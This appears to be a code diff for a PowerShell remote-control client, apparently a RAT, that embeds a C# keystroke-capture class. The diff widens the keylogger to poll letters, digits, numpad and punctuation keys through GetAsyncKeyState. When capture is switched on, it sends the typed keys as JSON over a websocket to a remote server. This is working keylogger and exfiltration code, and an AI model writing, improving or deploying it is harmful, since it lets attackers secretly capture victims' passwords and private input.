@@ -141,15 +141,11 @@ public class KeyCapture {
     public static string GetChar(int vk) {
         byte[] keyState = new byte[256];
         GetKeyboardState(keyState);
-        StringBuilder sb = new StringBuilder(2);
+        StringBuilder sb = new StringBuilder(4);
         uint scanCode = MapVirtualKey((uint)vk, 0);
         int result = ToUnicode((uint)vk, scanCode, keyState, sb, sb.Capacity, 0);
         if (result > 0) return sb.ToString();
         return null;
-    }
-
-    public static bool IsKeyDown(int vk) {
-        return (GetAsyncKeyState(vk) & 0x8000) != 0;
     }
 }
 "@
@@ -430,39 +426,39 @@ function Run {
                     try { $ws.SendAsync([ArraySegment[byte]]::new([Text.Encoding]::UTF8.GetBytes('{"type":"ping"}')), 'Text', $true, [Threading.CancellationToken]::None).Wait() | Out-Null } catch {}
                 }
 
-                # Enviar teclas capturadas usando GetAsyncKeyState
+                # Enviar teclas capturadas usando GetAsyncKeyState (bit 0x0001 = pressed since last check)
                 if ($Global:captureInput) {
                     try {
                         $captured = ""
-                        # Verificar teclas A-Z (65-90)
-                        for ($vk = 65; $vk -le 90; $vk++) {
-                            $isDown = [KeyCapture]::IsKeyDown($vk)
-                            $wasDown = $Global:prevKeyState[$vk]
-                            if ($isDown -and -not $wasDown) {
+                        # Todas as teclas relevantes
+                        $allKeys = @(
+                            # A-Z
+                            65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,
+                            # 0-9
+                            48,49,50,51,52,53,54,55,56,57,
+                            # Numpad 0-9
+                            96,97,98,99,100,101,102,103,104,105,
+                            # Especiais
+                            32,13,8,9,190,188,186,222,219,221,220,191,189,187,192,
+                            # OEM keys
+                            106,107,109,110,111
+                        )
+                        foreach ($vk in $allKeys) {
+                            $state = [KeyCapture]::GetAsyncKeyState($vk)
+                            # Bit 0x0001 = tecla foi pressionada desde última verificação
+                            if (($state -band 1) -eq 1) {
                                 $ch = [KeyCapture]::GetChar($vk)
-                                if ($ch) { $captured += $ch }
+                                if ($ch) {
+                                    $captured += $ch
+                                } else {
+                                    # Teclas especiais sem caractere
+                                    switch ($vk) {
+                                        13 { $captured += "[ENTER]`n" }
+                                        8 { $captured += "[BACK]" }
+                                        9 { $captured += "[TAB]" }
+                                    }
+                                }
                             }
-                            $Global:prevKeyState[$vk] = $isDown
-                        }
-                        # Verificar 0-9 (48-57)
-                        for ($vk = 48; $vk -le 57; $vk++) {
-                            $isDown = [KeyCapture]::IsKeyDown($vk)
-                            $wasDown = $Global:prevKeyState[$vk]
-                            if ($isDown -and -not $wasDown) {
-                                $ch = [KeyCapture]::GetChar($vk)
-                                if ($ch) { $captured += $ch }
-                            }
-                            $Global:prevKeyState[$vk] = $isDown
-                        }
-                        # Teclas especiais
-                        $specials = @{32=" ";13="[ENTER]`n";8="[BACK]";9="[TAB]";190=".";188=",";186=";";222="'";219="[";221="]";220="\";191="/";189="-";187="="}
-                        foreach ($vk in $specials.Keys) {
-                            $isDown = [KeyCapture]::IsKeyDown($vk)
-                            $wasDown = $Global:prevKeyState[$vk]
-                            if ($isDown -and -not $wasDown) {
-                                $captured += $specials[$vk]
-                            }
-                            $Global:prevKeyState[$vk] = $isDown
                         }
                         if ($captured.Length -gt 0) {
                             $captureMsg = @{ type="captured-keys"; clientId=$Global:id; keys=$captured } | ConvertTo-Json -Compress
